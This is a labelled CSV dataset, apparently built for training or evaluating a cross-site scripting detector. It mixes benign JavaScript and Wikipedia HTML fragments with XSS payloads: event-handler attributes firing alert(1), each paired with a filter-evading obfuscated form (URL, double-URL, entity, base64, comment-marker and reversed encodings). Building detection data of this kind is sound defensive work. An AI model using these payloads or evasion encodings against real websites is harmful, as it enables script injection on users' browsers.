sample_id,label,payload_original,payload_obfuscated,generator,recipe
2324,1,"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>",&lt;div draggabl/*OBF*/e=&quot;tr/*OBF*/  ue&quot; contenteditable&gt;drag me&lt;/div&gt; &lt;u ondrop=alert/*OBF*/(1) contenteditable&gt;drop here&lt;/u&gt; ,llm_style_t1.5,comment_marker+html_entities
2325,1,"<menu draggable=""true"" ondragleave=""alert(1)"">test</menu>",&lt;menu draggable=&quot;true&quot; ondragleave=&quot;alert(1)&quot;&gt;test&lt;/menu&gt;,llm_style_t1.5,html_entities
2326,1,"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",%253Cdiv%2520draggable%253D%2522true%2522%2520contenteditable%253Edrag%2520me%253C%252Fdiv%253E%253Cform%2520ondrag/*OBF*/over%253Dalert%25281%2529%2520co/*OBF*/ntenteditable%253Edrop%2520here%253C%252Fform%253E,llm_style_t1.5,double_urlencode
2327,0,var depmodifier = map.get(dep); if (depmodifier) { sort(depmodifier);,var depmodifier = map.get(dep); if (depmodifier) { sort(depmodifier);,llm_style_t1.5,none
2328,1,<img id=x tabindex=1 onfocus=alert(1)></img>,%253Cimg%2520id%253Dx%2520tabindex%253D1%2520onfocus%253Dalert%25281%2529%253E%253C%252Fimg%253E,llm_style_t1.5,double_urlencode
2329,0,"removehandler(element, events, typeevent, callable, isdelegated ? handler : null); return; }","removehandler(element, events, typeevent, callable, isdelegated ? handler : null); return; }",llm_style_t1.5,none
2330,0,"<li><a href=""/wiki/otto_neurath"" title=""otto neurath"">otto neurath </a> </li>","<li><a href=""/wiki/otto_neurath"" title=""otto neurath"">otto neurath </a> </li>",llm_style_t1.5,none
2331,0,"<p><a href=""/wiki/knowledge_representation"" class=""mw-redirect"" title=""knowledge representation"">knowledge representation </a><sup id=""cite_ref-knowledge_representation_91-0"" class=""reference""><a href=""#cite_note-knowledge_representation-91"">&#91;88&#93; </a> </sup> and <a href=""/wiki/knowledge_engineering"" title=""knowledge engineering"">knowledge engineering </a><sup id=""cite_ref-knowledge_engineering_92-0"" class=""reference""><a href=""#cite_note-knowledge_engineering-92"">&#91;89&#93; </a> </sup> are central to classical ai research. some ""expert systems"" attempt to gather together explicit knowledge possessed by experts in some narrow domain. in addition, some projects attempt to gather the ""commonsense knowledge"" known to the average person into a database containing extensive knowledge about the world. among the things a comprehensive commonsense knowledge base would contain are: objects, properties, categories and relations between objects;<sup id=""cite_ref-representing_categories_and_relations_93-0"" class=""reference""><a href=""#cite_note-representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> situations, events, states and time;<sup id=""cite_ref-representing_time_94-0"" class=""reference""><a href=""#cite_note-representing_time-94"">&#91;91&#93; </a> </sup> causes and effects;<sup id=""cite_ref-representing_causation_95-0"" class=""reference""><a href=""#cite_note-representing_causation-95"">&#91;92&#93; </a> </sup> knowledge about knowledge (what we know about what other people know);<sup id=""cite_ref-representing_knowledge_about_knowledge_96-0"" class=""reference""><a href=""#cite_note-representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> and many other, less well researched domains. a representation of ""what exists"" is an <a href=""/wiki/ontology_(computer_science)"" class=""mw-redirect"" title=""ontology (computer science)"">ontology </a>: the set of objects, relations, concepts, and properties formally described so that software agents can interpret them. the <a href=""/wiki/semantics"" title=""semantics"">semantics </a> of these are captured as <a href=""/wiki/description_logic"" title=""description logic"">description logic </a> concepts, roles, and individuals, and typically implemented as classes, properties, and individuals in the <a href=""/wiki/web_ontology_language"" title=""web ontology language"">web ontology language </a>.<sup id=""cite_ref-97"" class=""reference""><a href=""#cite_note-97"">&#91;94&#93; </a> </sup> the most general ontologies are called <a href=""/wiki/upper_ontology"" title=""upper ontology"">upper ontologies </a>, which attempt to provide a foundation for all other knowledge<sup id=""cite_ref-ontology_98-0"" class=""reference""><a href=""#cite_note-ontology-98"">&#91;95&#93; </a> </sup> by acting as mediators between <a href=""/wiki/domain_ontology"" class=""mw-redirect"" title=""domain ontology"">domain ontologies </a> that cover specific knowledge about a particular knowledge domain (field of interest or area of concern). such formal knowledge representations can be used in content-based indexing and retrieval,<sup id=""cite_ref-99"" class=""reference""><a href=""#cite_note-99"">&#91;96&#93; </a> </sup> scene interpretation,<sup id=""cite_ref-100"" class=""reference""><a href=""#cite_note-100"">&#91;97&#93; </a> </sup> clinical decision support,<sup id=""cite_ref-101"" class=""reference""><a href=""#cite_note-101"">&#91;98&#93; </a> </sup> knowledge discovery (mining ""interesting"" and actionable inferences from large databases),<sup id=""cite_ref-102"" class=""reference""><a href=""#cite_note-102"">&#91;99&#93; </a> </sup> and other areas.<sup id=""cite_ref-103"" class=""reference""><a href=""#cite_note-103"">&#91;100&#93; </a> </sup>","<p><a href=""/wiki/knowledge_representation"" class=""mw-redirect"" title=""knowledge representation"">knowledge representation </a><sup id=""cite_ref-knowledge_representation_91-0"" class=""reference""><a href=""#cite_note-knowledge_representation-91"">&#91;88&#93; </a> </sup> and <a href=""/wiki/knowledge_engineering"" title=""knowledge engineering"">knowledge engineering </a><sup id=""cite_ref-knowledge_engineering_92-0"" class=""reference""><a href=""#cite_note-knowledge_engineering-92"">&#91;89&#93; </a> </sup> are central to classical ai research. some ""expert systems"" attempt to gather together explicit knowledge possessed by experts in some narrow domain. in addition, some projects attempt to gather the ""commonsense knowledge"" known to the average person into a database containing extensive knowledge about the world. among the things a comprehensive commonsense knowledge base would contain are: objects, properties, categories and relations between objects;<sup id=""cite_ref-representing_categories_and_relations_93-0"" class=""reference""><a href=""#cite_note-representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> situations, events, states and time;<sup id=""cite_ref-representing_time_94-0"" class=""reference""><a href=""#cite_note-representing_time-94"">&#91;91&#93; </a> </sup> causes and effects;<sup id=""cite_ref-representing_causation_95-0"" class=""reference""><a href=""#cite_note-representing_causation-95"">&#91;92&#93; </a> </sup> knowledge about knowledge (what we know about what other people know);<sup id=""cite_ref-representing_knowledge_about_knowledge_96-0"" class=""reference""><a href=""#cite_note-representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> and many other, less well researched domains. a representation of ""what exists"" is an <a href=""/wiki/ontology_(computer_science)"" class=""mw-redirect"" title=""ontology (computer science)"">ontology </a>: the set of objects, relations, concepts, and properties formally described so that software agents can interpret them. the <a href=""/wiki/semantics"" title=""semantics"">semantics </a> of these are captured as <a href=""/wiki/description_logic"" title=""description logic"">description logic </a> concepts, roles, and individuals, and typically implemented as classes, properties, and individuals in the <a href=""/wiki/web_ontology_language"" title=""web ontology language"">web ontology language </a>.<sup id=""cite_ref-97"" class=""reference""><a href=""#cite_note-97"">&#91;94&#93; </a> </sup> the most general ontologies are called <a href=""/wiki/upper_ontology"" title=""upper ontology"">upper ontologies </a>, which attempt to provide a foundation for all other knowledge<sup id=""cite_ref-ontology_98-0"" class=""reference""><a href=""#cite_note-ontology-98"">&#91;95&#93; </a> </sup> by acting as mediators between <a href=""/wiki/domain_ontology"" class=""mw-redirect"" title=""domain ontology"">domain ontologies </a> that cover specific knowledge about a particular knowledge domain (field of interest or area of concern). such formal knowledge representations can be used in content-based indexing and retrieval,<sup id=""cite_ref-99"" class=""reference""><a href=""#cite_note-99"">&#91;96&#93; </a> </sup> scene interpretation,<sup id=""cite_ref-100"" class=""reference""><a href=""#cite_note-100"">&#91;97&#93; </a> </sup> clinical decision support,<sup id=""cite_ref-101"" class=""reference""><a href=""#cite_note-101"">&#91;98&#93; </a> </sup> knowledge discovery (mining ""interesting"" and actionable inferences from large databases),<sup id=""cite_ref-102"" class=""reference""><a href=""#cite_note-102"">&#91;99&#93; </a> </sup> and other areas.<sup id=""cite_ref-103"" class=""reference""><a href=""#cite_note-103"">&#91;100&#93; </a> </sup>",llm_style_t1.5,none
2332,1,<datalist onpointerup=alert(1)>xss</datalist>,%252526lt%25253Bdatalist%252520onpointerup%25253Dalert%2525281%252529%252526gt%25253Bxss%252526lt%25253B%25252Fdatalist%252526gt%25253B,llm_style_t1.5,html_entities+urlencode+double_urlencode
2333,0,"newcoordinates = this._repositionwithinscreen( targetleft, targettop,","newcoordinates = this._repositionwithinscreen( targetleft, targettop,",llm_style_t1.5,none
2334,1,"<audio onmousemove=""alert(1)"">test</audio>",&lt;audio onmousemove=&quot; alert(1)&quot;&gt;test&lt; /audio&gt;,llm_style_t1.5,whitespace_noise+html_entities
2335,0,var baseplacement = placement ? getbaseplacement(placement) : null,var baseplacement = placement ? getbaseplacement(placement) : null,llm_style_t1.5,none
2336,0,"var b = a.length;2 !== b || h.obj(a[0]) ? h.fnc(c.duration) || (d.duration = c.duration / b) : a = { value: a }; }return m(a).map(function (a, b) { b = b ? 0 : c.delay;a = h.obj(a) && !h.pth(a) ? a : { value: a };h.und(a.delay) && (a.delay = b);return a;","var b = a.length;2 !== b || h.obj(a[0]) ? h.fnc(c.duration) || (d.duration = c.duration / b) : a = { value: a }; }return m(a).map(function (a, b) { b = b ? 0 : c.delay;a = h.obj(a) && !h.pth(a) ? a : { value: a };h.und(a.delay) && (a.delay = b);return a;",llm_style_t1.5,none
2337,0,"this._queuecallback(complete, element, element.classlist.contains(class_name_fade$1)); } _keydown(event) {","this._queuecallback(complete, element, element.classlist.contains(class_name_fade$1)); } _keydown(event) {",llm_style_t1.5,none
2338,0,</span></a></dt><dd>learn how to use python’s builtin logging on scrapy.</dd>,</span></a></dt><dd>learn how to use python’s builtin logging on scrapy.</dd>,llm_style_t1.5,none
2339,1,"<col onkeypress=""alert(1)"" contenteditable>test</col>","<col onkeypress=""alert(1)  "" contenteditable>test</col>",llm_style_t1.5,whitespace_noise
2340,0,"<li><a href=""/wiki/domain-specific_language"" title=""domain-specific language"">domain-specific language </a> </li>","<li><a href=""/wiki/domain-specific_language"" title=""domain-specific language"">domain-specific language </a> </li>",llm_style_t1.5,none
2341,0,this._focustrap = this._initializefocustrap(); this._addeventlisteners(); },this._focustrap = this._initializefocustrap(); this._addeventlisteners(); },llm_style_t1.5,none
2342,1,"<nextid draggable=""true"" ondragstart=""alert(1)"">test</nextid>",JTI2bHQlM0JuZXh0aWQlMjBkcmF/*OBF*/nZ2FibGUlM0QlMjZxdW90JTNCdHJ1ZSUyNnF1b3QlM0IlMjBvbmRyYWdzdGFyd/*OBF*/CUz/*OBF*/RCUyNnF1b3QlM0JhbGVydCUyODElMjklMjZxdW90J/*OBF*/TNCJTI2Z3QlM0J0ZXN0JTI2bHQlM0IlMkZuZXh0aWQlMjZndCUzQg%253D%253D,llm_style_t1.5,html_then_urlencode+base64+double_urlencode
2343,1,<ol onpointerout=alert(1)>xss</ol>,%25253Col%252520onpointerout%25253Dalert%2525281%252529%25253Exss%25253C%25252Fol%25253E,llm_style_t1.5,double_urlencode+html_then_urlencode
2344,1,"<style>@keyframes slidein {}</style><h1 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></h1>",%26lt%3Bstyle%26gt%3B%40keyframes%20slidein%20%7B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Bh1%20style%3D%26quot%3Banimation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%26quot%3B%20onanimationiteration%3D%26quot%3Balert%281%29%26quot%3B%20%20%26gt%3B%26lt%3B%2Fh1%26gt%3B,llm_style_t1.5,whitespace_noise+html_then_urlencode
2345,1,"<noembed onmouseup=""alert(1)"">test</noembed>",%3Cnoembed%20onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,llm_style_t1.5,urlencode
2346,1,"<style>:target {transform: rotate(180deg);}</style><link id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></link>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTog/*OBF*/cm90YXRlKDE4MGRlZyk7fTw/*OBF*/vc3R5bGU%2BPGxpbmsgaWQ9eCBzdHlsZT0idHJhbnNpdGlvbjp0cmFuc2Zvcm0gMnMiIG9udHJhbnNpdGlvbnJ1bj1hbGVy/*OBF*/dCgxKT48L2xpbms%2B,llm_style_t1.5,base64+urlencode
2347,0,"if (prevselected !== selected) { $(this._valuedict[key].el).prop('selected', selected); this.$el.trigger('change');","if (prevselected !== selected) { $(this._valuedict[key].el).prop('selected', selected); this.$el.trigger('change');",llm_style_t1.5,none
2348,0,attributeoptions.html = tooltiptextoption,attributeoptions.html = tooltiptextoption,llm_style_t1.5,none
2349,0,"}) eventhandler.on(window, event_load_data_api, () => { for (const selector of selectorengine.find(open_selector)) {","}) eventhandler.on(window, event_load_data_api, () => { for (const selector of selectorengine.find(open_selector)) {",llm_style_t1.5,none
2350,1,<image onpointerleave=alert(1)>xss</image>,<im/*OBF*/age onp/*OBF*/ointerleave=alert(1)>xss</image>,llm_style_t1.5,comment_marker
2351,1,<aside onpointerover=alert(1)>xss</aside>,%3Caside%20onpoin/*OBF*/terover%3Dalert%281%29%3Exss%3C%2Faside%3E,llm_style_t1.5,urlencode+whitespace_noise
2352,0,const data_api_key$1 = '.data-api',const data_api_key$1 = '.data-api',llm_style_t1.5,none
2353,1,<nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>,PG5leHRpZCBpZD14IHRhYmluZGV4PTEgb25iZWZvcmVhY3RpdmF0ZT1hbGVydCgxKT48L25leHRpZD4=  ,llm_style_t1.5,comment_marker+base64+whitespace_noise
2354,0,b;for (b in a) { d[b] = c.hasownproperty(b) ? c[b] : a[b]; }return d;,b;for (b in a) { d[b] = c.hasownproperty(b) ? c[b] : a[b]; }return d;,llm_style_t1.5,none
2355,0,"arr = void 0, opts = this.options, isminyear = year === opts.minyear,","arr = void 0, opts = this.options, isminyear = year === opts.minyear,",llm_style_t1.5,none
2356,0,"acc[placement] = detectoverflow(state, {","acc[placement] = detectoverflow(state, {",llm_style_t1.5,none
2357,0,"}; function each(collection, callback) { var l = collection.length,","}; function each(collection, callback) { var l = collection.length,",llm_style_t1.5,none
2358,0,"}; class scrollspy extends component { constructor(el, options) {","}; class scrollspy extends component { constructor(el, options) {",llm_style_t1.5,none
2359,1,<embed onpointerout=alert(1)>xss</embed>,%253Cembed%2520onpointerout%253Dalert%25281%2529%253Exss%253C%252Fembed%253E,llm_style_t1.5,comment_marker+double_urlencode+html_entities
2360,0,"this.modal.open(); } }, {","this.modal.open(); } }, {",llm_style_t1.5,none
2361,0,return gethtmlelementscroll(node),return gethtmlelementscroll(node),llm_style_t1.5,none
2362,0,const completecallback = () => { if (!this._config.scroll || this._config.backdrop) { this._focustrap.activate(),const completecallback = () => { if (!this._config.scroll || this._config.backdrop) { this._focustrap.activate(),llm_style_t1.5,none
2363,0,"var e = d[b], k = e.animatable, h = e.tweens,","var e = d[b], k = e.animatable, h = e.tweens,",llm_style_t1.5,none
2364,0,this._renderdatedisplay(); datepicker._settostartofday(this.date); this.gotodate(this.date);,this._renderdatedisplay(); datepicker._settostartofday(this.date); this.gotodate(this.date);,llm_style_t1.5,none
2365,0,"const event_keydown_dismiss = `keydown.dismiss${event_key}` const selector_data_toggle = '[data-bs-toggle=""offcanvas""]' const default = {","const event_keydown_dismiss = `keydown.dismiss${event_key}` const selector_data_toggle = '[data-bs-toggle=""offcanvas""]' const default = {",llm_style_t1.5,none
2366,0,"<li><a href=""#citerefmoravec1988"">moravec 1988 </a>, p.&#160;13, </li>","<li><a href=""#citerefmoravec1988"">moravec 1988 </a>, p.&#160;13, </li>",llm_style_t1.5,none
2367,0,"f.push(b[1]), n.push(b[2]); }a = r(n, function (a, b) { return f[b] === c;","f.push(b[1]), n.push(b[2]); }a = r(n, function (a, b) { return f[b] === c;",llm_style_t1.5,none
2368,0,"function component(classdef, el, options) {","function component(classdef, el, options) {",llm_style_t1.5,none
2369,0,} return abbr ? opts.i18n.weekdaysabbrev[day] : opts.i18n.weekdays[day]; },} return abbr ? opts.i18n.weekdaysabbrev[day] : opts.i18n.weekdays[day]; },llm_style_t1.5,none
2370,0,return } if (this._isshown()) {,return } if (this._isshown()) {,llm_style_t1.5,none
2371,1,"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>","/dfn>test<(1)"">alert/*OBF*/ter=""ragen"" ond/*OBF*/""trueable=dragg<dfn ",llm_style_t1.5,reverse_chunks
2372,0,} _handlefocus(e) { if (!this.el.contains(e.target) && this._nthmodalopened === modal._modalsopen) {,} _handlefocus(e) { if (!this.el.contains(e.target) && this._nthmodalopened === modal._modalsopen) {,llm_style_t1.5,none
2373,1,"<dfn draggable=""true"" ondragstart=""alert(1)"">test</dfn>","< dfn draggable=""true"" ondragstart=""alert(1)"">test</  dfn>",llm_style_t1.5,whitespace_noise+comment_marker
2374,1,"<section onbeforecopy=""alert(1)"" contenteditable>test</section>",%3Csection%20onbeforecopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fsection%3E,llm_style_t1.5,urlencode
2375,1,"<i draggable=""true"" ondragend=""alert(1)"">test</i>",%3Ci%20draggable%3D%22true%22%20ondragend%3D%22alert%281%29%22%3Etest%3C%2Fi%3E,llm_style_t1.5,urlencode
2376,0,"} if ( entry.min === entry.max ) { throw new error(""nouislider: 'range' 'min' and 'max' cannot be equal."");","} if ( entry.min === entry.max ) { throw new error(""nouislider: 'range' 'min' and 'max' cannot be equal."");",llm_style_t1.5,none
2377,0,"'<div class=""datepicker-calendar""></div>',","'<div class=""datepicker-calendar""></div>',",llm_style_t1.5,none
2378,1,"<ol onpaste=""alert(1)"" contenteditable>test</ol>",%2526lt%253Bol%2520onpaste%253D%2526quot%253Balert%25281%2529%2526quot%253B%2520contenteditable%2526gt%253Btest%2526lt%253B%252Fol%2526gt%253B,llm_style_t1.5,html_entities+double_urlencode
